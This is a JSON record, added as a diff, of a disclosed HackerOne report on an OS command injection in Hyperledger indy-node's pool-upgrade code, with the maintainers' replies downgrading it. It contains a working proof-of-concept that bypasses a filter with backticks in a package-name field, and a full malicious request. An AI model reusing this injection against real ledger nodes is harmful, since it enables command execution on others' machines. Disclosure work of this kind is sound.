@@ -1,0 +1,507 @@
+{
+  "id": 1859592,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODU5NTky",
+  "url": "https://hackerone.com/reports/1859592",
+  "title": "[indy_node]POOL_UPGRADE command injection, Trustee Node can execute command in any other Node`s system.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "none",
+  "readable_substate": "Resolved",
+  "created_at": "2023-02-02T14:44:12.152Z",
+  "submitted_at": "2023-02-02T14:44:12.257Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "kmhlyxj0",
+    "url": "/kmhlyxj0",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ge9nqc4uzovevjhsukseo1h76fhy/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22522,
+    "url": "https://hackerone.com/hyperledger",
+    "handle": "hyperledger",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/522/14a496059824de0648d5d65966e9ab4dd8c8e715_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/522/14a496059824de0648d5d65966e9ab4dd8c8e715_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Hyperledger",
+      "twitter_handle": "hyperledger",
+      "website": "https://www.hyperledger.org/",
+      "about": "An industry-wide open source initiative to advance blockchain technology, governed by The Linux Foundation."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-04-27T14:48:14.887Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2023-04-11T15:49:42.151Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "After I finish my report, I found project this is not part of the bounty program, so I also commit this report. This issue is related to the [https://github.com/hyperledger/indy-node](https://github.com/hyperledger/indy-node).\n\nI found some function such as get_latest_pkg_version/_call_upgrade_script has  command injection vulnerability. \nnode_control_utils.py:\n```python\n    def get_latest_pkg_version(cls,pkg_name: str,upstream: SourceVersion = None, update_cache: bool = True) -> PackageVersion:\n        ...\n        try:\n            cmd = compose_cmd(\n                ['apt-cache', 'show', pkg_name, '|', 'grep', '-E', \"'^Version: '\"]\n            )\n            output = cls.run_shell_script_extended(cmd).strip()\n    ...\n```\nnode_control_noe.py:\n```python\n    def _call_upgrade_script(self, pkg_name: str, pkg_ver: PackageVersion):\n        logger.info(\n            \"Upgrading {} to package version {}, test_mode {}\"\n            .format(pkg_name, pkg_ver, int(self.test_mode))\n        )\n\n        deps = self._get_deps_list('{}={}'.format(pkg_name, pkg_ver))\n        deps = '\"{}\"'.format(deps)\n\n        cmd_file = 'upgrade_indy_node'\n        if self.test_mode:\n            cmd_file = 'upgrade_indy_node_test'\n\n        cmd = compose_cmd([cmd_file, deps])\n        NodeControlUtil.run_shell_script(cmd, timeout=self.timeout)\n```\nA Trustee can input a malicious package name to trigger this code.  There are two conditions for package name:\n1. Valid package name prefix, here I choose `indy-node`.\n2. Valid package version. Input value of version must bigger or equals than old version. If `reinstall` set to true, version can equal with the old version.\n3. bypass the fileter function `compose_cmd`. I found  some special characters  filtered in `compose_cmd` , that is `;|&&`:\n```python\ndef compose_cmd(cmd):\n    if os.name != 'nt':\n        cmd = ' '.join(cmd)\n        cmd = re.split(\";|&&\", cmd.splitlines()[0], 1)[0].rstrip()\n    return cmd\n```\nBut the special character \\`, is still valid to inject command. So I can input a package name , for example: indy-node2 \\`touch /tmp/12345678\\` . Finally The malicious POOL_UPGRADE request looks as follows:\n```json\n{\n    \"identifier\": \"V4SGRU86Z58d6TV7PBUe6f\",\n    \"operation\": {\n        \"action\": \"start\",\n        \"name\": \"test\",\n        \"package\": \"indy-node2 `touch /tmp/1234567`\",\n        \"schedule\": {\n            \"Gw6pDLhcBcoQesN72qfotTgFa7cbuqZpkX3Xo6pLhPhv\":\"2023-02-02T15:30:05.258870+00:00\",\n            \"8ECVSk179mjsjKRLWiQtssMLgp6EPhWXtaYyStWPSGAb\":\"2023-02-02T17:32:05.258870+00:00\",\n            \"DKVxG2fXXTU8yT5N7hGEbXB3dfdAnYv1JczDUHpmDxya\":\"2023-02-02T14:31:05.258870+00:00\",\n            \"4PS3EDQ3dW1tci1Bp6543CfuuebjFrg36kLAUcskGfaA\":\"2023-02-02T19:39:05.258870+00:00\"\n        },\n        \"sha256\": \"db34a72a90d026dae49c3b3f0436c8d3963476c77468ad955845a1ccf7b03f55\",\n        \"type\": \"109\",\n        \"reinstall\": true,\n        \"version\": \"1.12.6\"\n    },\n    \"protocolVersion\": 2,\n    \"reqId\": 1651152851,\n    \"signature\": \"4YoXKHNnWRouTUAW4fKuTANnXNJfY2JoPG4PoXfz4PUzjx4NySrAmzkzy6zCiRRf5uczZx5mQVSm1eCZLnUHUDoT\"\n}\n```\nStep to reproduce(use indy-cli):\n1. use indy-cli, Use a `TRUSTEE` DID:\n\n{F2150453} \n\n2. Run ledger pool_upgrade command, such as:\n\n```\nledger pool-upgrade name=\"security_test2\" version=1.12.6 action=start sha256=f284bdc3c1c9e24a494e285cb387c69510f28de51c15bb93179d9c7f28705398 schedule={\"Gw6pDLhcBcoQesN72qfotTgFa7cbuqZpkX3Xo6pLhPhv\":\"2023-02-02T15:30:05.258870+00:00\",\"8ECVSk179mjsjKRLWiQtssMLgp6EPhWXtaYyStWPSGAb\":\"2023-02-02T14:32:05.258870+00:00\",\"DKVxG2fXXTU8yT5N7hGEbXB3dfdAnYv1JczDUHpmDxya\":\"2023-02-02T13:31:05.258870+00:00\",\"4PS3EDQ3dW1tci1Bp6543CfuuebjFrg36kLAUcskGfaA\":\"2023-02-02T12:53:05.258870+00:00\"} package=\"indy-node `touch /tmp/1234567`\" reinstall=true\n```\n3. wait for schedule, you can what happend in `/var/log/indy/node_control.log`:\n\n{F2150481}\n\n## Impact\n\nA Trustee Node can execute command in any other Node`s system.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2150453,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z02ggzozuvv3vd7mfjprqwxr98t3?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPXH7W2A%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065542Z&X-Amz-Expires=2786&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIHPD5gEySofUz1xOLbF9RxzsoYi23gDFF6VpbtbxOEbOAiB0gZ0PrWMj9ApM1upCkFsCGj2wZDr0sHM%2FdCN3TWiFlSqwBQgjEAMaDDAxMzYxOTI3NDg0OSIMFefSibaONAmXZdeqKo0FrStIIybrOK6bEwZr5pyK3JxTPHUorBb2V3hjVumlSUzrcUlJuskVWrmNd4RZL3xYp2NFjX6sZJlmfTosswJ6ixEgQRESjrdVab2HF45mm1trgD3HzrFdEa05QJxHMZHXuB0vxaGaUOTokNTEwFLItAjHN8%2FHLB9ycpatLFRq4uVN52spSmTZuDQndEo8CrKUsfA6BtwhxzLkkyZXne1e7M4CpAzxKNKcPiko1jpES02h%2Fmpk5SDR%2BRZgUwj065jAzDlJI%2FvKBvp8t7GbOQq5n5ZWH%2Bz25xRNvUE4i5RKXJizerdDmxAuRROSFAzpdj497%2Fu1CSvhiDHUA%2FVbn8aRwo5DUTNtQtdEeOAEEwiUDCqAgMd5lKuIYIFEIDBuOZNAgvte6VgIXN37ZrqXGK1lsZDS2Hv2bBBHglR9kA4uWBUlZddQ0fUlTAThnBO%2FkixEijGrsWLkkqt8dXMp%2FKYzi2wtDguJlqkw8pnHiViufOnyhy3mr5aLppahgdAOgCchFtV7W9lAV4PB4O0o4p2B9tFko0Jtrln3CsOFrrIzCFf%2BqS2LdxwMZ1jZR3buat3bHV7T5DKtUBs4MGMx6kIi%2FI8gpiY69A3lVRFCjHfWE12sqHEdq9rnG07syd1vglEXDaqqJe%2BYfYR5Ee8nKmckWCkLt0pEGiIA%2FRI%2Bs0ch6NccoW1IiW1uRJG2o64XI%2Bhv3%2Ff2Jg1XfOr%2FKnljk3KQypfib6Zo3eySEuL4cPDCbFIQ%2B4fpUtNBwB%2B6TbMKThow0d%2B9zURqcAZ6QSoDbaT9p04JVxFeOyWzLmH5zvIIt52C%2FVUHGoRrO3ELP6qYs0snGQH6%2FmKbyjnqEMAatXzXI2U9K25Q6ELBK1NGPV0wwYC5qAY6sgHvPFSU40Te8U3TvG0%2FxnZKpqRY7RwHe0EqI8E%2Ffn%2FbAzZtS1msTHhvGiqBntJ%2BccpQwaI%2F7uuwU5ZbJ0JKOVnnBIFFbA%2F2LUwsTSOccxF6VQyLkJQfo0TACBsb8BuejEQN1JySWmkU0BakfQo05LRh87A3TuiIhaxJJzE6m%2B%2BClcIezMNMH9ULosA4UY1PvvIIQAIFyFjboubORtGvP383QMi6o8GCABrtvUKoxEMaCYgZ&X-Amz-SignedHeaders=host&X-Amz-Signature=598d84d1dedbacb5de131c3c9678a0a0b5cd2c0992affe2dc4a971c8e2fe3b42",
+      "file_size": 41111,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2150481,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6f6tibjp9vbbmd0spc7lf3vqgsf9?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPXH7W2A%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065542Z&X-Amz-Expires=2786&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIHPD5gEySofUz1xOLbF9RxzsoYi23gDFF6VpbtbxOEbOAiB0gZ0PrWMj9ApM1upCkFsCGj2wZDr0sHM%2FdCN3TWiFlSqwBQgjEAMaDDAxMzYxOTI3NDg0OSIMFefSibaONAmXZdeqKo0FrStIIybrOK6bEwZr5pyK3JxTPHUorBb2V3hjVumlSUzrcUlJuskVWrmNd4RZL3xYp2NFjX6sZJlmfTosswJ6ixEgQRESjrdVab2HF45mm1trgD3HzrFdEa05QJxHMZHXuB0vxaGaUOTokNTEwFLItAjHN8%2FHLB9ycpatLFRq4uVN52spSmTZuDQndEo8CrKUsfA6BtwhxzLkkyZXne1e7M4CpAzxKNKcPiko1jpES02h%2Fmpk5SDR%2BRZgUwj065jAzDlJI%2FvKBvp8t7GbOQq5n5ZWH%2Bz25xRNvUE4i5RKXJizerdDmxAuRROSFAzpdj497%2Fu1CSvhiDHUA%2FVbn8aRwo5DUTNtQtdEeOAEEwiUDCqAgMd5lKuIYIFEIDBuOZNAgvte6VgIXN37ZrqXGK1lsZDS2Hv2bBBHglR9kA4uWBUlZddQ0fUlTAThnBO%2FkixEijGrsWLkkqt8dXMp%2FKYzi2wtDguJlqkw8pnHiViufOnyhy3mr5aLppahgdAOgCchFtV7W9lAV4PB4O0o4p2B9tFko0Jtrln3CsOFrrIzCFf%2BqS2LdxwMZ1jZR3buat3bHV7T5DKtUBs4MGMx6kIi%2FI8gpiY69A3lVRFCjHfWE12sqHEdq9rnG07syd1vglEXDaqqJe%2BYfYR5Ee8nKmckWCkLt0pEGiIA%2FRI%2Bs0ch6NccoW1IiW1uRJG2o64XI%2Bhv3%2Ff2Jg1XfOr%2FKnljk3KQypfib6Zo3eySEuL4cPDCbFIQ%2B4fpUtNBwB%2B6TbMKThow0d%2B9zURqcAZ6QSoDbaT9p04JVxFeOyWzLmH5zvIIt52C%2FVUHGoRrO3ELP6qYs0snGQH6%2FmKbyjnqEMAatXzXI2U9K25Q6ELBK1NGPV0wwYC5qAY6sgHvPFSU40Te8U3TvG0%2FxnZKpqRY7RwHe0EqI8E%2Ffn%2FbAzZtS1msTHhvGiqBntJ%2BccpQwaI%2F7uuwU5ZbJ0JKOVnnBIFFbA%2F2LUwsTSOccxF6VQyLkJQfo0TACBsb8BuejEQN1JySWmkU0BakfQo05LRh87A3TuiIhaxJJzE6m%2B%2BClcIezMNMH9ULosA4UY1PvvIIQAIFyFjboubORtGvP383QMi6o8GCABrtvUKoxEMaCYgZ&X-Amz-SignedHeaders=host&X-Amz-Signature=85760e880ad49ce8afaff4789374d95bdd7d09f58860e260382c675c69b5f13f",
+      "file_size": 97593,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-05-11T15:49:42.369Z",
+  "allow_singular_disclosure_after": -11631960.320891531,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "zy9ard3",
+    "shivammusic"
+  ],
+  "severity": {
+    "rating": "none",
+    "score": 0.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 179157,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/hyperledger/fabric-amcl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 20235695,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for the report.\n\nThe Trustee role in an Indy network can, by design, execute any command they want.  A “malicious” Trustee already has full access to the network and can therefore make any changes to the network — no need to inject malicious code. Production networks are commonly set up requiring multiple Trustees to sign transactions to prevent a single malicious Trustee from doing something bad.\n\nWe will look to see if further cleanup of the `compose_cmd` is needed, but the initial authoriztion of the transaction based on the configuration rules of the network and the signatures in the transaction is sufficient to prevent damage to the network.",
+      "automated_response": false,
+      "created_at": "2023-02-03T15:27:54.631Z",
+      "updated_at": "2023-02-03T15:27:54.631Z",
+      "actor": {
+        "username": "swcurran",
+        "cleared": false,
+        "verified": false,
+        "url": "/swcurran",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    },
+    {
+      "id": 20236098,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for you reply, maybe it's my misunderstood. I thought that controlling the network node is not equal to controlling the machine to execute commands. \nBy the way, I think cleanup of the `compose_cmd` is needed. ",
+      "automated_response": false,
+      "created_at": "2023-02-03T16:09:31.508Z",
+      "updated_at": "2023-02-03T16:09:31.508Z",
+      "actor": {
+        "username": "kmhlyxj0",
+        "cleared": false,
+        "verified": false,
+        "url": "/kmhlyxj0",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ge9nqc4uzovevjhsukseo1h76fhy/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    },
+    {
+      "id": 20236289,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "The Trustees operate the network, and execute transactions to both configure and update the network.  A Steward operates a node of the network and can update their own node — but are limited by what is permitted by the network.  Updating the nodes of the network (for example, to upgrade to a new version) is done via the pool-upgrade command, which must be signed by DIDs with roles identified in the network’s configuration.  Usually that is a sub-set of the Trustees.  Whatever is configured is checked before any of the operations of the transaction are executed, which prevents malicious operations.\n\nWe’re still looking at the `compose_cmd`.",
+      "automated_response": false,
+      "created_at": "2023-02-03T16:26:12.452Z",
+      "updated_at": "2023-02-03T16:26:12.452Z",
+      "actor": {
+        "username": "swcurran",
+        "cleared": false,
+        "verified": false,
+        "url": "/swcurran",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    },
+    {
+      "id": 20236763,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for your patient explanation. ☺︎",
+      "automated_response": false,
+      "created_at": "2023-02-03T16:41:50.300Z",
+      "updated_at": "2023-02-03T16:41:50.300Z",
+      "actor": {
+        "username": "kmhlyxj0",
+        "cleared": false,
+        "verified": false,
+        "url": "/kmhlyxj0",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ge9nqc4uzovevjhsukseo1h76fhy/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    },
+    {
+      "id": 20337053,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "We’ve reviewed/tested the code further and there is a need to improve the cleansing of the command, as identified in the report, but because the proper permissions check is done, only a properly signed transaction can get to the relevant code, and a properly signed transaction can do pretty much anything, so has no need to exploit the vulnerability. We will address the issue as it is bad practice to leave it as is, but it is not a significant issue.\n\n@ryjones over to you to decide on how to wrap this up.\n\nThanks for the report!",
+      "automated_response": false,
+      "created_at": "2023-02-10T15:08:43.441Z",
+      "updated_at": "2023-02-10T15:08:43.441Z",
+      "actor": {
+        "username": "swcurran",
+        "cleared": false,
+        "verified": false,
+        "url": "/swcurran",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    },
+    {
+      "id": 20337101,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-02-10T15:12:12.093Z",
+      "updated_at": "2023-02-10T15:12:12.093Z",
+      "additional_data": {
+        "old_severity": "High (7.2)",
+        "new_severity": "None (0.0)",
+        "old_severity_id": 1847358,
+        "new_severity_id": 1859336
+      },
+      "actor": {
+        "username": "swcurran",
+        "cleared": false,
+        "verified": false,
+        "url": "/swcurran",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    },
+    {
+      "id": 20337112,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hi,\n\nThanks for your report! We’ve reviewed/tested the code further and there is a need to improve the cleansing of the command, as identified in the report, but because the proper permissions check is done, only a properly signed transaction can get to the relevant code, and a properly signed transaction can do pretty much anything, so has no need to exploit the vulnerability. We will address the issue as it is bad practice to leave it as is, but it is not a significant issue.\n\nThanks",
+      "automated_response": false,
+      "created_at": "2023-02-10T15:13:15.003Z",
+      "updated_at": "2023-02-10T15:13:15.003Z",
+      "actor": {
+        "username": "swcurran",
+        "cleared": false,
+        "verified": false,
+        "url": "/swcurran",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    },
+    {
+      "id": 21228938,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::NotEligibleForBounty",
+      "message": "outside bounty program",
+      "automated_response": false,
+      "created_at": "2023-04-11T15:48:35.020Z",
+      "updated_at": "2023-04-11T15:48:35.020Z",
+      "actor": {
+        "url": "/hyperledger",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/522/14a496059824de0648d5d65966e9ab4dd8c8e715_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Hyperledger"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    },
+    {
+      "id": 21228947,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-04-11T15:49:24.672Z",
+      "updated_at": "2023-04-11T15:49:24.672Z",
+      "actor": {
+        "username": "ryjones",
+        "cleared": false,
+        "verified": false,
+        "url": "/ryjones",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/190/898/16fe922a06ceb4649331e21bb3e89674e236554b_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "kmhlyxj0",
+        "url": "/kmhlyxj0"
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    },
+    {
+      "id": 21228950,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-04-11T15:49:42.236Z",
+      "updated_at": "2023-04-11T15:49:42.236Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "ryjones",
+        "cleared": false,
+        "verified": false,
+        "url": "/ryjones",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/190/898/16fe922a06ceb4649331e21bb3e89674e236554b_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    },
+    {
+      "id": 21580294,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ManuallyDisclosed",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-04-27T14:48:14.816Z",
+      "updated_at": "2023-04-27T14:48:14.816Z",
+      "actor": {
+        "username": "ryjones",
+        "cleared": false,
+        "verified": false,
+        "url": "/ryjones",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/190/898/16fe922a06ceb4649331e21bb3e89674e236554b_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    },
+    {
+      "id": 23070710,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportCollaboratorInvited",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-07-30T09:47:50.408Z",
+      "updated_at": "2023-07-30T09:47:50.408Z",
+      "actor": {
+        "username": "kmhlyxj0",
+        "cleared": false,
+        "verified": false,
+        "url": "/kmhlyxj0",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ge9nqc4uzovevjhsukseo1h76fhy/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    },
+    {
+      "id": 23070715,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportCollaboratorInvited",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-07-30T09:50:31.068Z",
+      "updated_at": "2023-07-30T09:50:31.068Z",
+      "actor": {
+        "username": "kmhlyxj0",
+        "cleared": false,
+        "verified": false,
+        "url": "/kmhlyxj0",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ge9nqc4uzovevjhsukseo1h76fhy/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    },
+    {
+      "id": 23070750,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportCollaboratorInvited",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-07-30T10:00:10.033Z",
+      "updated_at": "2023-07-30T10:00:10.033Z",
+      "actor": {
+        "username": "kmhlyxj0",
+        "cleared": false,
+        "verified": false,
+        "url": "/kmhlyxj0",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ge9nqc4uzovevjhsukseo1h76fhy/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    },
+    {
+      "id": 23072887,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportCollaboratorInvited",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-07-30T16:35:17.447Z",
+      "updated_at": "2023-07-30T16:35:17.447Z",
+      "actor": {
+        "username": "kmhlyxj0",
+        "cleared": false,
+        "verified": false,
+        "url": "/kmhlyxj0",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ge9nqc4uzovevjhsukseo1h76fhy/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "hyperledger"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
